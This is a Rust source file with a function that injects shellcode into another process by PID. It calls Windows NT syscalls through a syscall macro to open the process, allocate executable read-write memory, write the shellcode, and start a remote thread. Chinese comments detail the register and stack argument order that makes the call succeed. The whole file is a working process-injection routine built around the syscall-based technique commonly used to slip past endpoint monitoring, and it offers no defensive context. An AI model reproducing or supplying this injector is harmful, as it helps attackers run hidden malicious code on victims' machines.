
use ntapi::winapi::shared::ntdef::{NULL, OBJECT_ATTRIBUTES};
use ntapi::winapi::um::winnt::{
    MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READWRITE, THREAD_ALL_ACCESS,
};
use rust_syscalls::syscall;
use std::ffi::c_void;
use std::os::windows::raw::HANDLE;
use std::ptr::null_mut;
use windows::Win32::System::Threading::PROCESS_ALL_ACCESS;
use windows::Win32::System::WindowsProgramming::CLIENT_ID;

pub fn indirect_call(shellcode: &[u8], pid: u32) {
    unsafe {
        let mut status;
        let mut process_handle: HANDLE = null_mut();

        // Initialize Object Attributes
        // Set up CLIENT_ID
        // looks like this does not work !
        let mut client_id: CLIENT_ID = std::mem::zeroed();
        client_id.UniqueProcess = windows::Win32::Foundation::HANDLE(pid as *mut c_void);
        client_id.UniqueThread = windows::Win32::Foundation::HANDLE(0 as *mut c_void);

        let mut oa: OBJECT_ATTRIBUTES = OBJECT_ATTRIBUTES {
            Length: size_of::<OBJECT_ATTRIBUTES>() as _,
            RootDirectory: NULL,
            ObjectName: NULL as _,
            Attributes: 0,
            SecurityDescriptor: NULL,
            SecurityQualityOfService: NULL,
        };

        // 打开目标进程，获取进程句柄
        status = syscall!(
            "NtOpenProcess",
            &mut process_handle as *mut HANDLE,
            PROCESS_ALL_ACCESS,
            &mut oa,
            &client_id as *const _
        );

        if status != 0 {
            println!("Failed to open target process: 0x{:X}", status);
            return;
        }

        println!("NtOpenProcess Opened Successfully: {:?}", status);

        println!(
            "Successfully opened process with handle: {:?}",
            process_handle
        );

        let mut shellcode_alloc: *mut c_void = null_mut();
        let mut region_size: usize = 0x1000;

        // Allocate memory
        // 目标进程申请内存用于存放shellcode
        status = syscall!(
            "NtAllocateVirtualMemory",
            process_handle,
            &mut shellcode_alloc as *mut _,
            0,
            &mut region_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );

        if status != 0 {
            println!("Failed to allocate memory: 0x{:X}", status);
            // Clean up: Close the opened process handle
            syscall!("NtClose", process_handle);
            return;
        }

        println!("NtAllocateVirtualMemory Success: {}", status);
        println!(
            "Successfully allocated memory at: {:?}, size: {} bytes",
            shellcode_alloc, region_size
        );

        loop {
            let mut bytes_written: usize = 0;

            // 向目标进程写入shellcode
            status = syscall!(
                "NtWriteVirtualMemory",
                process_handle,
                shellcode_alloc,
                shellcode.as_ptr() as *const _,
                shellcode.len(),
                &mut bytes_written
            );

            if status != 0 {
                println!("Failed to write shellcode: 0x{:X}", status);
                break;
            }

            println!(
                "Successfully wrote shellcode to memory. Bytes written: {}",
                bytes_written
            );

            // Execute the shellcode using NtCreateThreadEx
            // Execute the shellcode using NtCreateThreadEx
            let mut thread_handle: HANDLE = null_mut();

            // 强制所有参数转 usize，并严格按顺序（rcx -> rdx -> r8 -> r9 -> 栈参数）
            // 十分重要，一定要对齐，要不然会失败报0xC0000017  STATUS_NO_MEMORY
            // 创建远程线程执行shellcode
            status = syscall!(
                "NtCreateThreadEx",
                &mut thread_handle as *mut HANDLE as usize, // rcx: PHANDLE out
                THREAD_ALL_ACCESS as usize,                 // rdx: DesiredAccess
                0usize,                                     // r8:  POBJECT_ATTRIBUTES = NULL
                process_handle as usize,                    // r9:  ProcessHandle
                shellcode_alloc as usize,   // 栈 param 1: StartRoutine (PVOID -> usize)
                0usize,                     // 栈 param 2: Argument (PVOID = NULL)
                0usize,                     // 栈 param 3: CreateFlags (ULONG = 0, 不挂起)
                0usize,                     // 栈 param 4: ZeroBits (ULONG_PTR = 0)
                0usize,                     // 栈 param 5: StackSize (SIZE_T = 0, 默认)
                0usize,                     // 栈 param 6: MaximumStackSize (SIZE_T = 0, 默认)
                0usize                      // 栈 param 7: AttributeList (PPS_ATTRIBUTE_LIST = NULL)
            );

            if status != 0 {
                println!("Failed to create thread: 0x{:X}", status);
                break;
            }

            println!("NtCreateThreadEx Executed Successfully: {}", status);

            // Wait for thread to finish
            status = syscall!("NtWaitForSingleObject", thread_handle, 0, NULL);

            if status != 0 {
                println!("Failed to wait for thread: 0x{:X}", status);
                break;
            }

            break;
        }

        // 释放资源
        // Free the allocated memory
        if shellcode_alloc != null_mut() {
            let free_status = syscall!(
                "NtFreeVirtualMemory",
                process_handle,
                &mut shellcode_alloc as *mut _,
                &mut region_size as *mut _,
                MEM_RELEASE
            );
            if free_status != 0 {
                println!("Failed to free memory: 0x{:X}", free_status);
            }
        }

        // Close the process handle
        if process_handle != null_mut() {
            syscall!("NtClose", process_handle);
        }

        println!("Shellcode execution completed. All resources cleaned up!");
    }
}
